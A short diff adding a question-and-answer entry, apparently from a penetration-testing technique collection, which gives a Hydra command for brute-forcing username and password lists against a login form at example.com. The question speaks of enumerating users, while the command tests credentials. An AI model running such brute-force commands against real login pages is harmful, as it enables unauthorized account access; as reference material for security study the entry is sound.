@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How can you enumerate users for a suspected login brute-force attack?
+
+CONTEXT:
+The application has a login form at http://example.com/login.
+
+METHOD / ANSWER:
+Command: `hydra -L users.txt -P passwords.txt http-post-form "http://example.com/login:username=^USER^&password=^PASS^:F=incorrect password"`
+Explanation: This command uses Hydra to test a list of usernames and passwords against the login form to identify valid credentials.
